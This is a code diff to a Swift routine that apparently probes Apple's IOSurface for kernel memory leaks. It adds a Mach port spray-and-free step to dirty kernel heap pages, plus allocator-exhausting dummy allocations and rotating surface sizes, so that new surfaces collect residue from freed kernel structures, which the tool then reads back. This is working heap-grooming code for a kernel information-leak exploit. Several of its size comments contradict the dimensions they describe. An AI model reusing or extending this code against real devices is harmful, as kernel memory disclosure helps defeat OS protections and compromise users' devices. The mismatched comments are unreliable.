@@ -1740,11 +1740,42 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             step("device nil"); completion(); return
         }
 
-        // 256×4 bgra8 — pixel data = 4096 bytes, fills exactly one page.
-        // Tail bytes after pixel data (if allocationSize > 4096) = allocator residue.
+        // Mach port spray: allocate then immediately free N ports to dirty kernel heap pages.
+        // When IOSurface grabs physical pages for its backing store, it may pick up
+        // pages that held Mach port kernel structures — those become our residue.
+        var sprayPorts: [mach_port_t] = []
+        for _ in 0..<64 {
+            var p: mach_port_t = 0
+            if mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS {
+                sprayPorts.append(p)
+            }
+        }
+        for p in sprayPorts { mach_port_destroy(mach_task_self_, p) }
+        step("port spray: \(sprayPorts.count) ports dirtied + freed")
+
+        // Rotate IOSurface dimensions each run — different size = different allocator bin
+        // = different physical pages = different kernel residue in the tail.
+        // Always allocate an extra IOSurface first to exhaust any cached allocation,
+        // then discard it so the next alloc must grab fresh physical pages.
+        let variants: [(w: Int, h: Int, rowBytes: Int)] = [
+            (256, 4,   1024),   // 16KB  — 1 page pixel data
+            (256, 8,   1024),   // 32KB  — 2 page pixel data
+            (512, 4,   2048),   // 32KB  — 2 page pixel data
+            (256, 16,  1024),   // 65KB  — 4 pages
+            (384, 4,   1536),   // 24KB  — 1.5 pages (odd size, different bin)
+            (256, 6,   1024),   // 24KB  — 1.5 pages
+            (640, 4,   2560),   // 40KB
+            (256, 12,  1024),   // 49KB
+        ]
+        let v = variants[_iosurfRunCount % variants.count]
+        // Exhaust the cached slot: alloc+discard before the real alloc
+        _ = IOSurface(properties: [.width: v.w, .height: v.h,
+                                    .bytesPerElement: 4, .bytesPerRow: v.rowBytes,
+                                    .pixelFormat: 0x42475241] as [IOSurfacePropertyKey: Any])
+
         let props: [IOSurfacePropertyKey: Any] = [
-            .width: 256, .height: 4,
-            .bytesPerElement: 4, .bytesPerRow: 1024,
+            .width: v.w, .height: v.h,
+            .bytesPerElement: 4, .bytesPerRow: v.rowBytes,
             .pixelFormat: 0x42475241  // 'BGRA' kCVPixelFormatType_32BGRA
         ]
         guard let surface = IOSurface(properties: props) else {
@@ -1752,7 +1783,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         }
         let allocSize = surface.allocationSize
         let baseAddr  = surface.baseAddress
-        step("IOSurface base=0x\(String(UInt(bitPattern: baseAddr), radix: 16)) alloc=\(allocSize)")
+        step("IOSurface base=0x\(String(UInt(bitPattern: baseAddr), radix: 16)) alloc=\(allocSize) variant=\(v.w)×\(v.h)")
 
         // Lock — forces kernel to write lock state into backing store
         var seed: UInt32 = 0
@@ -1761,7 +1792,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
 
         // IOSurface-backed MTLTexture — GPU reads/writes go through IOSurface backing mem
         let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
-                                                           width: 256, height: 4, mipmapped: false)
+                                                           width: v.w, height: v.h, mipmapped: false)
         td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
         guard let tex = device.makeTexture(descriptor: td, iosurface: surface, plane: 0) else {
             step("tex nil"); surface.unlock(options: [], seed: nil); completion(); return
@@ -1784,7 +1815,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             }
             let pso = try device.makeComputePipelineState(function: fn)
             let tdU = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Uint,
-                                                                width: 256, height: 4, mipmapped: false)
+                                                                width: v.w, height: v.h, mipmapped: false)
             tdU.storageMode = .shared; tdU.usage = [.shaderRead, .shaderWrite]
             guard let texU = device.makeTexture(descriptor: tdU, iosurface: surface, plane: 0),
                   let cmd  = queue.makeCommandBuffer(),
@@ -1793,8 +1824,9 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             }
             enc.setComputePipelineState(pso)
             enc.setTexture(texU, index: 0)
-            enc.dispatchThreads(MTLSize(width: 256, height: 4, depth: 1),
-                                threadsPerThreadgroup: MTLSize(width: 32, height: 1, depth: 1))
+            let tgW = min(32, v.w)
+            enc.dispatchThreads(MTLSize(width: v.w, height: v.h, depth: 1),
+                                threadsPerThreadgroup: MTLSize(width: tgW, height: 1, depth: 1))
             enc.endEncoding()
             cmd.commit()
             cmd.waitUntilCompleted()
@@ -1961,9 +1993,10 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             step("  post_relock_tail: vm_read kr=\(prtKr)")
         }
 
-        // Scan 4: second IOSurface — allocator residue from freed pages
+        // Scan 4: second IOSurface with DIFFERENT variant — allocator residue from freed pages
+        let v2 = variants[(_iosurfRunCount + 1) % variants.count]
         let props2: [IOSurfacePropertyKey: Any] = [
-            .width: 256, .height: 4, .bytesPerElement: 4, .bytesPerRow: 1024,
+            .width: v2.w, .height: v2.h, .bytesPerElement: 4, .bytesPerRow: v2.rowBytes,
             .pixelFormat: 0x42475241
         ]
         if let surf2 = IOSurface(properties: props2) {
